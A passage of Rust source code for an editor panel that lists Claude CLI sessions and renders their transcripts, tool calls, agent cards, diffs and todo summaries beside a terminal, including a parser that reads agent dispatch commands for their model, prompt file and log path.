        let gutter = gutter_shown.then(|| self.render_anchor_gutter(cx));
        match area {
            WorkArea::TerminalOnly => {
                let terminal = self.render_terminal_area(cx);
                if let Some(gutter) = gutter {
                    h_flex()
                        .flex_grow_1()
                        .min_h_0()
                        .min_w_0()
                        .w_full()
                        .h_full()
                        .child(terminal)
                        .child(gutter)
                        .into_any_element()
                } else {
                    terminal
                }
            }
            WorkArea::RailOnly => {
                let transcript = self.render_transcript_section(window, cx);
                let live_message = self.render_live_message(window, cx);
                v_flex()
                    .min_h_0()
                    .overflow_hidden()
                    .flex_grow_1()
                    .w_full()
                    .child(transcript)
                    .children(live_message)
                    .into_any_element()
            }
            WorkArea::TerminalAndRail => {
                let transcript = self.render_transcript_section(window, cx);
                let live_message = self.render_live_message(window, cx);
                let rail_width = self.displayed_rail_width();
                let panel = cx.entity().downgrade();
                let rail = v_flex()
                    .min_h_0()
                    .overflow_hidden()
                    .w(rail_width)
                    .h_full()
                    .flex_none()
                    .child(transcript)
                    .children(live_message);
                h_flex()
                    .relative()
                    .flex_grow_1()
                    .min_h_0()
                    .w_full()
                    .child(
                        canvas(
                            move |bounds, _, cx| {
                                panel
                                    .update(cx, |this, cx| {
                                        this.remember_rail_budget(bounds.size.width, cx);
                                    })
                                    .log_err();
                            },
                            |_, _, _, _| {},
                        )
                        .absolute()
                        .size_full(),
                    )
                    .child(self.render_terminal_area(cx))
                    .children(gutter)
                    .child(self.render_rail_resize_handle(cx))
                    .child(rail)
                    .into_any_element()
            }
        }
    }
}

impl Render for ClaudeSessionsPanel {
    /// The two halves are never drawn together: the dock draws the list of sessions and
    /// an editor tab draws the conversation of the selected one, because a transcript is
    /// not readable at the width of a dock and the list is what the dock is for.
    fn render(&mut self, window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        if self.in_pane {
            self.set_store_visible(true, cx);
            self.sync_terminal(window, cx);
        }
        // A subagent's records are not the tmux pane the session is running in.
        let reading_an_agent = matches!(
            self.store.read(cx).transcript_target(),
            TranscriptTarget::Subagent { .. }
        );

        v_flex()
            .key_context("ClaudeSessionsPanel")
            .track_focus(&self.focus_handle)
            .relative()
            .size_full()
            .on_drag_move(
                cx.listener(|this, event: &DragMoveEvent<DraggedRail>, _, cx| {
                    this.on_rail_drag_move(event, cx);
                }),
            )
            .on_drop::<DraggedRail>(cx.listener(|this, _, _, _cx| {
                this.rail_drag_position = None;
            }))
            .map(|this| {
                let this = if self.in_pane {
                    this.bg(conversation_background(cx))
                        .child(self.render_conversation_toolbar(window, cx))
                        .children(self.render_error(cx))
                        .children(self.render_agent_chips(cx))
                        .child(self.render_terminal_and_rail(reading_an_agent, window, cx))
                        .children(self.render_pending_permission(cx))
                        .children((!reading_an_agent).then(|| self.render_status_line(cx)))
                } else {
                    this.child(self.render_session_section(cx))
                };
                this.children(self.render_zoomed_image(cx))
            })
    }
}

impl Focusable for ClaudeSessionsPanel {
    fn focus_handle(&self, cx: &App) -> FocusHandle {
        self.terminal_focus_handle(cx)
    }
}

impl EventEmitter<PanelEvent> for ClaudeSessionsPanel {}

/// Emitted when the tab's name is out of date, which is whenever the selected session
/// changes — the tab is named after the conversation it holds.
pub struct ItemNameChanged;

impl EventEmitter<ItemNameChanged> for ClaudeSessionsPanel {}

/// Lets the same view be opened as a tab in the editor area, where a conversation has
/// the width of a pane to be read at. The tab draws the session's terminal beside the
/// transcript; the dock draws the session list.
impl Item for ClaudeSessionsPanel {
    type Event = ItemNameChanged;

    fn to_item_events(_event: &Self::Event, f: &mut dyn FnMut(workspace::item::ItemEvent)) {
        f(workspace::item::ItemEvent::UpdateTab);
    }

    /// The tab holds one conversation, so it is named after that session rather than
    /// after the panel. Selecting another session in the dock renames it, because both
    /// views read the same store.
    fn tab_content_text(&self, _detail: usize, cx: &App) -> SharedString {
        let store = self.store.read(cx);
        let selected = store.selected();
        let ai_title = store.main_transcript().ai_title();
        let session_name = store
            .sessions()
            .iter()
            .find(|session| selected == Some(session.session.session_id.as_str()))
            .map(|session| {
                let name = preferred_session_name(&session.session, ai_title);
                match session.tmux_target.as_deref().and_then(tmux_session_name) {
                    Some(tmux_session) => SharedString::from(format!("[{tmux_session}] {name}")),
                    None => SharedString::from(name),
                }
            })
            .or_else(|| {
                store
                    .ended_sessions()
                    .iter()
                    .find(|session| selected == Some(session.session_id.as_str()))
                    .map(|session| {
                        SharedString::from(preferred_name(
                            session.ai_title.as_deref(),
                            session.name.as_deref(),
                            session.session_id.as_str(),
                        ))
                    })
            })
            .unwrap_or_else(|| SharedString::from("Claude Sessions"));

        // Each of a session's agents is opened as a tab of its own, so naming them all
        // after the session would leave the reader with several tabs reading the same
        // name and no way to tell which held which conversation.
        let TranscriptTarget::Subagent {
            agent_id,
            workflow_run_id,
        } = store.transcript_target()
        else {
            return session_name;
        };
        // The summary is gone once the session it belonged to has exited, and the tab
        // outlives that, so the id it was opened for is what is left to name it by.
        let agent = store
            .subagents()
            .iter()
            .find(|summary| {
                summary.agent_id == *agent_id && summary.workflow_run_id == *workflow_run_id
            })
            .map(agent_chip_label)
            .unwrap_or_else(|| {
                SharedString::from(
                    agent_id
                        .chars()
                        .take(AGENT_ID_CHIP_CHARACTERS)
                        .collect::<String>(),
                )
            });
        SharedString::from(format!("{session_name} · {agent}"))
    }

    fn tab_icon(&self, _window: &Window, _cx: &App) -> Option<Icon> {
        Some(Icon::new(IconName::AiClaude))
    }

    fn deactivated(&mut self, _window: &mut Window, cx: &mut Context<Self>) {
        self.set_store_visible(false, cx);
    }
}

impl Panel for ClaudeSessionsPanel {
    fn persistent_name() -> &'static str {
        "ClaudeSessionsPanel"
    }

    fn panel_key() -> &'static str {
        CLAUDE_SESSIONS_PANEL_KEY
    }

    fn activation_focus_handle(&self, cx: &App) -> FocusHandle {
        self.terminal_focus_handle(cx)
    }

    fn position(&self, _window: &Window, cx: &App) -> DockPosition {
        dock_position(ClaudeSessionsSettings::get_global(cx).dock)
    }

    fn position_is_valid(&self, position: DockPosition) -> bool {
        matches!(position, DockPosition::Left | DockPosition::Right)
    }

    /// Written to the settings file rather than kept here, which is what makes the side
    /// the user dragged the panel to still be its side after a restart.
    fn set_position(
        &mut self,
        position: DockPosition,
        _window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        settings::update_settings_file(self.fs.clone(), cx, move |settings, _| {
            let dock = match position {
                DockPosition::Right => DockSide::Right,
                // `position_is_valid` refuses the bottom dock, so this is only reached by
                // a caller that ignored it; the left-hand side is the default.
                DockPosition::Left | DockPosition::Bottom => DockSide::Left,
            };
            settings.claude_sessions.get_or_insert_default().dock = Some(dock);
        });
    }

    fn default_size(&self, _window: &Window, _cx: &App) -> Pixels {
        px(420.)
    }

    fn icon(&self, _window: &Window, _cx: &App) -> Option<IconName> {
        Some(IconName::AiClaude)
    }

    fn icon_tooltip(&self, _window: &Window, _cx: &App) -> Option<&'static str> {
        Some("Claude Sessions")
    }

    fn toggle_action(&self) -> Box<dyn gpui::Action> {
        Box::new(ToggleFocus)
    }

    fn activation_priority(&self) -> u32 {
        11
    }

    fn set_active(&mut self, active: bool, window: &mut Window, cx: &mut Context<Self>) {
        self.set_store_visible(active, cx);
        if active && let Some(terminal) = &self.terminal {
            terminal.focus_handle(cx).focus(window, cx);
        }
    }
}

/// The reader's own messages, keyed as the entries are.
///
/// A slash command is included because that is the entry a `/goal` record is drawn as,
/// and a comparison of a path against the drawn conversation has to see it as the
/// reader's message.
#[cfg(test)]
fn user_messages(entries: &[Entry]) -> Vec<(SharedString, SharedString)> {
    entries
        .iter()
        .filter_map(|entry| match &entry.kind {
            EntryKind::Message {
                role: MessageRole::User,
                source,
                ..
            } => Some((entry.key.clone(), source.clone())),
            EntryKind::SlashCommand { text } => Some((entry.key.clone(), text.clone())),
            _ => None,
        })
        .collect()
}

/// The messages the CLI is holding behind the turn it is running, read from the queue
/// log, as rows of the conversation.
fn queued_entries<'queue>(queued: impl IntoIterator<Item = &'queue SharedString>) -> Vec<Entry> {
    queued
        .into_iter()
        // A background task reporting in is queued exactly as a message typed mid-turn
        // is, and its text is nothing but the block the CLI wrote to tell itself. Held to
        // the same rule as the conversation's own records — what is left once the
        // injected blocks are cut — so a notification is dropped and typed words, which
        // are never one of those blocks, are kept whole.
        .filter_map(|text| user_visible_text(text))
        .map(|text| queued_message_body(&text))
        .map(|text| Entry {
            // Keyed on the text: the queue log gives these no id of their own, and the
            // key has to be the same across rebuilds or the list remeasures an item that
            // did not change.
            key: SharedString::from(format!("queued-{text}")),
            kind: EntryKind::Queued {
                text: SharedString::from(text),
            },
        })
        .collect()
}

/// The user's own messages in one conversation, as the entries [`build_entries`] would
/// give the same records, and nothing else the records hold.
///
/// Building that conversation whole to get them would decode every image the session
/// has ever pasted — a screenshot is around a megabyte and a half of base64 — on each
/// of the four rebuilds a second a streaming reply causes. The keys have to be the ones
/// the drawn conversation carries;
/// [`the_user_messages_read_off_a_path_are_the_ones_the_built_entries_carry`] holds the
/// two together.
#[cfg(test)]
fn user_message_entries(path: &[&TranscriptRecord]) -> Vec<Entry> {
    let mut entries = Vec::new();

    for (path_index, record) in path.iter().enumerate() {
        let base_key = match record.uuid.as_ref() {
            Some(uuid) => SharedString::from(uuid.clone()),
            None => SharedString::from(format!("path-{path_index}")),
        };

        // A message typed while the session was answering is written as an attachment
        // and never as a user record, so it is the only record that message will ever
        // get. Left out here, the send that carried it is paired with nothing and its
        // `Sending…` message stays on screen for the rest of the session, beside the
        // conversation drawing the very same words.
        if record.record_type == ATTACHMENT_RECORD_TYPE {
            if let Some(prompt) = queued_command_prompt(record) {
                entries.push(Entry {
                    key: base_key,
                    kind: EntryKind::Message {
                        role: MessageRole::User,
                        source: prompt,
                        usage: None,
                        answered_at: None,
                    },
                });
            }
            continue;
        }

        // A record of another kind holds no message the user typed: an assistant record
        // is the model's, and the two subtypes below are drawn as something other than a
        // message.
        if record.record_type != USER_RECORD_TYPE
            || matches!(
                record.subtype.as_deref(),
                Some(COMPACT_BOUNDARY_SUBTYPE) | Some(LOCAL_COMMAND_SUBTYPE)
            )
        {
            continue;
        }

        match record
            .raw
            .get("message")
            .and_then(|message| message.get("content"))
        {
            Some(Value::String(text)) => {
                if let Some(kind) = message_kind(record, text) {
                    entries.push(Entry {
                        key: base_key,
                        kind,
                    });
                }
            }
            Some(Value::Array(blocks)) => {
                for (block_index, block) in blocks.iter().enumerate() {
                    // Only a text block can be a message, and skipping the rest is what
                    // keeps an image out of a walk performed for its neighbour's text.
                    if block.get("type").and_then(Value::as_str) != Some("text") {
                        continue;
                    }
                    let text = block
                        .get("text")
                        .and_then(Value::as_str)
                        .unwrap_or_default();
                    if let Some(kind) = message_kind(record, text) {
                        entries.push(Entry {
                            key: SharedString::from(format!("{base_key}#{block_index}")),
                            kind,
                        });
                    }
                }
            }
            _ => {}
        }
    }

    entries
}

/// What the selected session is doing, as far as its transcript says.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Activity {
    Thinking,
    RunningTool {
        name: SharedString,
        target: SharedString,
    },
    Idle,
}

/// Reads off what a session is doing from the conversation it has written.
///
/// The registry's `status` field is not used for this. It is rewritten only when the
/// status changes, so a session that stopped an hour ago still carries whatever it last
/// wrote there — an idle session reading as `busy` for the rest of the day. The
/// transcript is the only thing that moves with the model, and reading it needs no clock,
/// which is what makes this answer testable.
/// Read backwards from the end of the conversation, because what the session is doing is
/// whatever the newest record that says anything says — and the first record that does
/// decides, rather than the whole path being summarised.
fn activity(path: &[&TranscriptRecord]) -> Activity {
    // The calls answered by the results written after the record being looked at. A call
    // is running exactly when nothing further down the conversation answers it.
    let mut answered: HashSet<&str> = HashSet::default();

    for &record in path.iter().rev() {
        match record.record_type.as_str() {
            USER_RECORD_TYPE => {
                let results = tool_result_ids(record);
                if results.is_empty() {
                    // Words the user typed. Whatever the model was doing before them
                    // belongs to a turn the user has already spoken past, and calling
                    // that running is the same lie the registry's `status` field tells.
                    return Activity::Idle;
                }
                answered.extend(results);
            }
            ASSISTANT_RECORD_TYPE => return assistant_activity(record, &answered),
            // A compact boundary, an attachment, a `mode` line: none of them say
            // anything about what the session is doing, so the search reads past them.
            _ => {}
        }
    }

    Activity::Idle
}

/// What an assistant record says the session is doing.
///
/// Only its last block is read. The blocks are written in order, so the last one is what
/// the model was doing when it stopped writing: a record that thought and then made a
/// call is doing the call, and a record that ends in prose is a turn that has been
/// answered.
fn assistant_activity(record: &TranscriptRecord, answered: &HashSet<&str>) -> Activity {
    let Some(block) = record
        .raw
        .get("message")
        .and_then(|message| message.get("content"))
        .and_then(Value::as_array)
        .and_then(|blocks| blocks.last())
    else {
        return Activity::Idle;
    };

    match block.get("type").and_then(Value::as_str) {
        Some(TOOL_USE_BLOCK_TYPE) => {
            let id = block.get("id").and_then(Value::as_str).unwrap_or_default();
            if answered.contains(id) {
                // The call is over and the model has not written its next record yet.
                return Activity::Idle;
            }
            Activity::RunningTool {
                name: SharedString::from(
                    block
                        .get("name")
                        .and_then(Value::as_str)
                        .unwrap_or("Tool")
                        .to_string(),
                ),
                target: tool_target(block),
            }
        }
        Some(THINKING_BLOCK_TYPE) => Activity::Thinking,
        // Prose, an image, a block this has no rule for: the model has said something,
        // which is a turn ending rather than work in progress.
        _ => Activity::Idle,
    }
}

/// The `tool_use_id`s of the results a user record holds. Empty for a record that is
/// words the user typed, which is what tells the two apart.
fn tool_result_ids(record: &TranscriptRecord) -> Vec<&str> {
    let Some(blocks) = record
        .raw
        .get("message")
        .and_then(|message| message.get("content"))
        .and_then(Value::as_array)
    else {
        return Vec::new();
    };

    blocks
        .iter()
        .filter(|block| block.get("type").and_then(Value::as_str) == Some(TOOL_RESULT_BLOCK_TYPE))
        .filter_map(|block| block.get("tool_use_id").and_then(Value::as_str))
        .collect()
}

/// The words drawn beside a running tool's name to say which call it is.
///
/// First string among `file_path`, `path`, `pattern`, `url`, `query`, `command`,
/// `description`, `skill`, then `prompt` (first line), then the first string-valued
/// top-level input field. Never JSON.
fn tool_target(block: &Value) -> SharedString {
    tool_target_from_input(block.get("input"))
}

fn tool_target_from_input(input: Option<&Value>) -> SharedString {
    let argument = |key: &str| {
        input
            .and_then(|input| input.get(key))
            .and_then(Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
    };

    const PREFERRED: [&str; 8] = [
        "file_path",
        "path",
        "pattern",
        "url",
        "query",
        "command",
        "description",
        "skill",
    ];

    if let Some(target) = PREFERRED.iter().find_map(|key| argument(key)) {
        return SharedString::from(truncate_and_trailoff(target, TOOL_TARGET_CHARACTERS));
    }

    if let Some(prompt) = argument("prompt") {
        let line = prompt
            .lines()
            .find(|line| !line.trim().is_empty())
            .unwrap_or("");
        return SharedString::from(truncate_and_trailoff(
            line.trim(),
            TOOL_TARGET_PROMPT_CHARACTERS,
        ));
    }

    if let Some(object) = input.and_then(Value::as_object) {
        for value in object.values() {
            if let Some(text) = value
                .as_str()
                .map(str::trim)
                .filter(|text| !text.is_empty())
            {
                return SharedString::from(truncate_and_trailoff(text, TOOL_TARGET_CHARACTERS));
            }
        }
    }

    SharedString::from("")
}

/// Whether a path a session said it sent may be handed to the machine's own opener.
///
/// The path is a string from the transcript, and opening one runs whatever the OS has
/// registered for it, so it is held to the boundary the panel already reads attachments
/// under rather than to nothing at all.
fn sent_path_is_openable(path: &Path, working_directory: &Path) -> bool {
    attachment_is_readable(path, working_directory)
}

fn mcp_tool_parts(name: &str) -> Option<(&str, &str)> {
    let rest = name.strip_prefix("mcp__")?;
    let (server, tool) = rest.split_once("__")?;
    if server.is_empty() || tool.is_empty() {
        return None;
    }
    Some((server, tool))
}

fn edit_diff_text(old: &str, new: &str) -> String {
    let diff = similar::TextDiff::from_lines(old, new);
    let mut output = String::new();
    for change in diff.iter_all_changes() {
        let sign = match change.tag() {
            similar::ChangeTag::Delete => '-',
            similar::ChangeTag::Insert => '+',
            similar::ChangeTag::Equal => ' ',
        };
        output.push(sign);
        output.push_str(change.value().trim_end_matches('\n'));
        output.push('\n');
    }
    output
}

/// The diff an `Edit` card draws, or `None` when the call's result carries the patch
/// that was really applied. One call is drawn with one diff: the patch is what the edit
/// did, the input diff is what it was asked to do, and showing both says the same change
/// twice in two shapes.
fn edit_card_diff<'diff>(
    diff: Option<&'diff SharedString>,
    id: Option<&SharedString>,
    patched_calls: &HashSet<SharedString>,
) -> Option<&'diff SharedString> {
    if id.is_some_and(|id| patched_calls.contains(id)) {
        return None;
    }
    diff
}

/// The ids of the calls whose results carry a `structuredPatch`.
fn calls_answered_with_a_patch(path: &[&TranscriptRecord]) -> HashSet<SharedString> {
    let mut answered = HashSet::default();
    for record in path {
        if structured_patch_text(record.raw.get("toolUseResult")).is_none() {
            continue;
        }
        let Some(blocks) = record
            .raw
            .get("message")
            .and_then(|message| message.get("content"))
            .and_then(Value::as_array)
        else {
            continue;
        };
        for block in blocks {
            if block.get("type").and_then(Value::as_str) != Some(TOOL_RESULT_BLOCK_TYPE) {
                continue;
            }
            if let Some(id) = block.get("tool_use_id").and_then(Value::as_str) {
                answered.insert(SharedString::from(id.to_string()));
            }
        }
    }
    answered
}

fn edit_input_diff(input: &Value) -> Option<String> {
    let old = input.get("old_string").and_then(Value::as_str);
    let new = input.get("new_string").and_then(Value::as_str);
    if old.is_none() && new.is_none() {
        return None;
    }
    let old = old.unwrap_or("");
    let new = new.unwrap_or("");
    // A line diff is quadratic in the worst case and an `Edit` carries whatever the
    // model wrote, so past this much text the card says what it replaced instead. The
    // result's `structuredPatch`, when there is one, is already the whole answer.
    if old.len().saturating_add(new.len()) > MAX_EDIT_DIFF_BYTES {
        return Some(format!(
            "{} replaced by {} — too large to diff here",
            describe_byte_count(old.len() as u64),
            describe_byte_count(new.len() as u64)
        ));
    }
    Some(edit_diff_text(old, new))
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum TodoStatus {
    Pending,
    InProgress,
    Completed,
}

struct TodoItem {
    content: SharedString,
    status: TodoStatus,
}

fn parse_todos(input: &Value) -> Option<Vec<TodoItem>> {
    let todos = input.get("todos")?.as_array()?;
    let mut items = Vec::new();
    for todo in todos {
        let content = todo
            .get("content")
            .and_then(Value::as_str)
            .unwrap_or("")
            .trim();
        let status = match todo.get("status").and_then(Value::as_str) {
            Some("pending") => TodoStatus::Pending,
            Some("in_progress") => TodoStatus::InProgress,
            Some("completed") => TodoStatus::Completed,
            _ => return None,
        };
        items.push(TodoItem {
            content: SharedString::from(content.to_string()),
            status,
        });
    }
    Some(items)
}

/// The one line a collapsed TodoWrite card is read from: how much of the list is done,
/// and what the session is on right now.
fn todo_summary(todos: &[TodoItem]) -> SharedString {
    let done = todos
        .iter()
        .filter(|todo| todo.status == TodoStatus::Completed)
        .count();
    let summary = format!("Todo · {done}/{} done", todos.len());
    match todos
        .iter()
        .find(|todo| todo.status == TodoStatus::InProgress)
        .map(|todo| todo.content.trim())
        .filter(|content| !content.is_empty())
    {
        Some(running) => SharedString::from(format!(
            "{summary} · {}",
            truncate_and_trailoff(running, TOOL_TARGET_CHARACTERS)
        )),
        None => SharedString::from(summary),
    }
}

struct AskedQuestion {
    header: SharedString,
    question: SharedString,
    options: Vec<SharedString>,
}

fn parse_asked_questions(input: &Value) -> Option<Vec<AskedQuestion>> {
    let questions = input.get("questions")?.as_array()?;
    let mut asked = Vec::new();
    for question in questions {
        let header = question
            .get("header")
            .and_then(Value::as_str)
            .unwrap_or("")
            .trim();
        let text = question
            .get("question")
            .and_then(Value::as_str)
            .unwrap_or("")
            .trim();
        let options = question
            .get("options")
            .and_then(Value::as_array)
            .map(|options| {
                options
                    .iter()
                    .filter_map(|option| {
                        option
                            .get("label")
                            .and_then(Value::as_str)
                            .map(str::trim)
                            .filter(|label| !label.is_empty())
                            .map(|label| SharedString::from(label.to_string()))
                    })
                    .collect()
            })
            .unwrap_or_default();
        asked.push(AskedQuestion {
            header: SharedString::from(header.to_string()),
            question: SharedString::from(text.to_string()),
            options,
        });
    }
    Some(asked)
}

fn ask_user_answer_text(body: &ToolResultBody) -> Option<SharedString> {
    let text = match body {
        ToolResultBody::Inline(text) => text.as_ref(),
        ToolResultBody::Persisted(persisted) => persisted.preview.as_ref(),
    };
    let trimmed = text.trim();
    if trimmed.is_empty() {
        return None;
    }
    Some(pretty_ask_user_answers(trimmed))
}

fn pretty_ask_user_answers(text: &str) -> SharedString {
    let Ok(value) = serde_json::from_str::<Value>(text) else {
        return SharedString::from(text.to_string());
    };
    let mut lines = Vec::new();
    if let Some(answers) = value.get("answers").and_then(Value::as_array) {
        for answer in answers {
            if let Some(line) = ask_user_answer_line(answer) {
                lines.push(line);
            }
        }
    } else if let Some(line) = ask_user_answer_line(&value) {
        lines.push(line);
    }
    if lines.is_empty() {
        SharedString::from(text.to_string())
    } else {
        SharedString::from(lines.join("\n"))
    }
}

fn ask_user_answer_line(value: &Value) -> Option<String> {
    value
        .as_str()
        .map(str::to_string)
        .or_else(|| {
            value
                .get("label")
                .and_then(Value::as_str)
                .map(str::to_string)
        })
        .or_else(|| {
            value
                .get("text")
                .and_then(Value::as_str)
                .map(str::to_string)
        })
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty())
}

struct CliDispatch {
    model: Option<SharedString>,
    prompt_path: Option<PathBuf>,
    log_path: Option<PathBuf>,
}

/// One word of a shell command, with the quotes that grouped it removed.
///
/// `quoted` is what keeps the parsing below out of the prompt: every interesting piece of
/// a dispatch — the program, its flags, the redirect — is written unquoted, while the
/// prompt handed to the agent is the one part that is quoted and may hold anything,
/// including the words `--model` and `>`.
struct CommandWord {
    text: String,
    quoted: bool,
}

/// Splits a command into its words the way a shell would for this purpose: on unquoted
/// whitespace, honouring single and double quotes. Nothing is expanded; `$(cat …)` stays
/// one word because the quotes around it say so.
fn command_words(command: &str) -> Vec<CommandWord> {
    let mut words = Vec::new();
    let mut text = String::new();
    let mut started = false;
    let mut quoted = false;
    let mut inside: Option<char> = None;

    for character in command.chars() {
        match inside {
            Some(quote) if character == quote => inside = None,
            Some(_) => text.push(character),
            None if character == '"' || character == '\'' => {
                inside = Some(character);
                started = true;
                quoted = true;
            }
            None if character.is_whitespace() => {
                if started {
                    words.push(CommandWord {
                        text: std::mem::take(&mut text),
                        quoted,
                    });
                    started = false;
                    quoted = false;
                }
            }
            None => {
                text.push(character);
                started = true;
            }
        }
    }
    if started {
        words.push(CommandWord { text, quoted });
    }
    words
}

/// Whether one of the words names a program, allowing for the absolute paths these are
/// usually written with.
fn word_is_program(word: &CommandWord, program: &str) -> bool {
    !word.quoted && (word.text == program || word.text.ends_with(&format!("/{program}")))
}

fn parse_cli_dispatch(command: &str) -> Option<CliDispatch> {
    let words = command_words(command);
    let dispatches = words.iter().enumerate().any(|(index, word)| {
        let next = words
            .get(index.saturating_add(1))
            .map(|word| word.text.as_str());
        (word_is_program(word, "agent") && next == Some("-f"))
            || word_is_program(word, "agy")
            || (word_is_program(word, "codex") && next == Some("exec"))
    });
    if !dispatches {
        return None;
    }
    Some(CliDispatch {
        model: dispatch_flag_value(&words, "--model")
            .or_else(|| dispatch_flag_value(&words, "-m"))
            .map(SharedString::from),
        prompt_path: dispatch_prompt_path(command, &words),
        log_path: dispatch_redirect_path(&words),
    })
}

/// The value written for `flag`, which has to be a word of its own — the `-m` inside
/// `--max-old-space-size=512` names no model — and outside the prompt.
fn dispatch_flag_value(words: &[CommandWord], flag: &str) -> Option<String> {
    let with_equals = format!("{flag}=");
    words.iter().enumerate().find_map(|(index, word)| {
        if word.quoted {
            return None;
        }
        if let Some(value) = word.text.strip_prefix(&with_equals) {
            return (!value.is_empty()).then(|| value.to_string());
        }
        if word.text != flag {
            return None;
        }
        words
            .get(index.saturating_add(1))
            .map(|value| value.text.clone())
            .filter(|value| !value.is_empty())
    })
}

fn dispatch_prompt_path(command: &str, words: &[CommandWord]) -> Option<PathBuf> {
    if let Some(rest) = command.split_once("$(cat ").map(|(_, rest)| rest) {
        let end = rest.find(')')?;
        let path = rest.get(..end)?.trim().trim_matches('"').trim_matches('\'');
        if !path.is_empty() {
            return Some(PathBuf::from(path));
        }
    }
    dispatch_flag_value(words, "-p")
        .filter(|value| !value.starts_with('$') && value.contains('/'))
        .map(PathBuf::from)
}

/// Where the command's own output was redirected. The last unquoted `>` wins, because a
/// command may redirect more than once; a `>` inside the prompt is not a redirect at all.
fn dispatch_redirect_path(words: &[CommandWord]) -> Option<PathBuf> {
    let path = words.iter().enumerate().rev().find_map(|(index, word)| {
        if word.quoted {
            return None;
        }
        if word.text.starts_with('>') {
            let path = word.text.trim_start_matches('>').trim();
            if !path.is_empty() {
                return Some(path.to_string());
            }
            return words
                .get(index.saturating_add(1))
                .filter(|next| !next.quoted)
                .map(|next| next.text.clone());
        }
        None
    })?;
    (!path.is_empty()).then(|| PathBuf::from(path))
}

fn report_path_in_prompt(text: &str) -> Option<PathBuf> {
    if let Some(rest) = text.split_once("Report file:") {
        let path = rest.1.lines().next().unwrap_or("").trim();
        if !path.is_empty() {
            return Some(PathBuf::from(path));
        }
    }
    for word in text.split_whitespace() {
        if word.ends_with(".md") && (word.contains("report") || word.contains('/')) {
            return Some(PathBuf::from(
                word.trim_matches(|c| c == '`' || c == '"' || c == '\''),
            ));
        }
    }
    None
}

fn format_turn_footer(
    duration_ms: u64,
    message_count: u64,
    pending_background_agents: u64,
) -> String {
    let total_seconds = duration_ms / 1000;
    let minutes = total_seconds / 60;
    let seconds = total_seconds % 60;
    let duration = if minutes == 0 {
        format!("{seconds}s")
    } else {
        format!("{minutes}m {seconds}s")
    };
    let messages = if message_count == 1 {
        "1 message".to_string()
    } else {
        format!("{message_count} messages")
    };
    if pending_background_agents == 0 {
        format!("{duration} · {messages}")
    } else if pending_background_agents == 1 {
        format!("{duration} · {messages} · 1 agent still running")
    } else {
        format!("{duration} · {messages} · {pending_background_agents} agents still running")
    }
}

fn parse_tool_input(input: &str) -> Option<Value> {
    serde_json::from_str(input).ok()
}

/// Whether one of the selected session's agents is still working.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum AgentState {
    Running,
    Finished,
}

/// The conversation list, told to report where the reader is whenever they move.
///
/// The list cannot answer [`ListState::is_scrolled_to_end`] until every item it holds has
/// been measured, and a conversation that is still arriving always holds one that has
/// not — so asking it is answered with `None` for as long as the session keeps talking,
/// and a reader who scrolled up during that is never noticed to have done so. The scroll
/// event says which items are visible, which needs no measuring.
fn scroll_tracking_list_state(cx: &mut Context<ClaudeSessionsPanel>) -> ListState {
    let list_state = ListState::new(0, ListAlignment::Bottom, px(1024.));
    list_state.set_scroll_handler({
        let panel = cx.weak_entity();
        move |event, _window, cx| {
            let at_end = event.visible_range.end >= event.count;
            panel
                .update(cx, |panel, _| {
                    panel.scrolled_to_end = at_end;
                    // Arriving back at the bottom is having read what landed there.
                    if at_end {
                        panel.unread_below.scrolled(true);
                    }
                })
                .log_err();
        }
    });
    list_state
}

/// Whether the conversation holds the `tool_result` answering `tool_use_id`.
///
/// Read down the whole conversation rather than along the path the model can still
/// see. Compaction deliberately severs that chain, so a call answered before one
/// would read as unanswered against the active path for the rest of the session.
#[cfg(test)]
fn call_is_answered(transcript: &crate::Transcript, tool_use_id: &str) -> bool {
    transcript
        .full_path()
        .iter()
        .any(|record| tool_result_ids(record).contains(&tool_use_id))
}

/// A `tool_use` block that spawned conversations of its own.
#[derive(Clone, Debug, PartialEq, Eq)]
struct AgentCall {
    tool_use_id: SharedString,
    is_workflow: bool,
}

/// One agent as the card under the call that spawned it draws it.
struct AgentCardRow {
    label: SharedString,
    state: AgentState,
    /// Whether the card is drawn at all; see [`agent_row_is_offered`]. A card that is not
    /// offered is still built, because the line above the cards and the heading above each
    /// phase count what the run spawned rather than what is left on screen.
    offered: bool,
    /// The phase of the run this agent belongs to, for an agent of a `Workflow` run that
    /// recorded one. A run of several phases is otherwise a row of cards that say nothing
    /// about which part of the run they are.
    phase: Option<SharedString>,
    target: TranscriptTarget,
}

/// What the line above a `Workflow` call's cards says the run is doing: how many agents
/// it has spawned so far, and how many of those are still working.
fn workflow_run_note(cards: &[AgentCardRow]) -> SharedString {
    let running = cards
        .iter()
        .filter(|card| card.state == AgentState::Running)
        .count();
    let agents = if cards.len() == 1 { "agent" } else { "agents" };
    // A run with nothing left running has either finished or is between phases, and
    // `0 running` reads as a claim about which one it is.
    if running == 0 {
        return SharedString::from(format!("{} {agents} · none running", cards.len()));
    }
    SharedString::from(format!("{} {agents} · {running} running", cards.len()))
}

/// Whether one of the selected session's agents is still working.
///
/// Never read off the agent's own transcript: it ends when the agent stops writing and
/// records nothing about having returned. What says an agent is over depends on how it
/// was spawned — a `Task` agent by the result of its call, a `Workflow` agent by the
/// journal its run writes, because that call is answered while the run is still going.
fn agent_state(summary: &SubagentSummary, main_path: &[&TranscriptRecord]) -> AgentState {
    // Preferred over anything read here: the scan read the agent's own session's
    // conversation, which is the only one that answers for an agent of a session this
    // panel is not following, and it knows how the agent was spawned — which decides
    // what in that conversation means it has returned. See
    // [`SubagentSummary::task_agent_finished`].
    if let Some(finished) = summary.task_agent_finished {
        return if finished {
            AgentState::Finished
        } else {
            AgentState::Running
        };
    }

    if let Some(tool_use_id) = summary.meta.tool_use_id.as_deref() {
        let answered = main_path
            .iter()
            .any(|record| tool_result_ids(record).contains(&tool_use_id));
        return if answered {
            AgentState::Finished
        } else {
            AgentState::Running
        };
    }

    // A `Workflow` run's agents record no tool use id, and the call that started the run
    // is answered the moment the run is launched rather than when it ends, so the
    // conversation holds nothing that says one of them is over. The run's own journal is
    // the only record of that, and the machine the run happened on has already read it.
    if summary.workflow_run_id.is_some() {
        return match summary.workflow_agent_finished {
            Some(true) => AgentState::Finished,
            // No journal to read, or one that does not name this agent yet. Both are
            // states a run passes through while it is working, so neither is it ending.
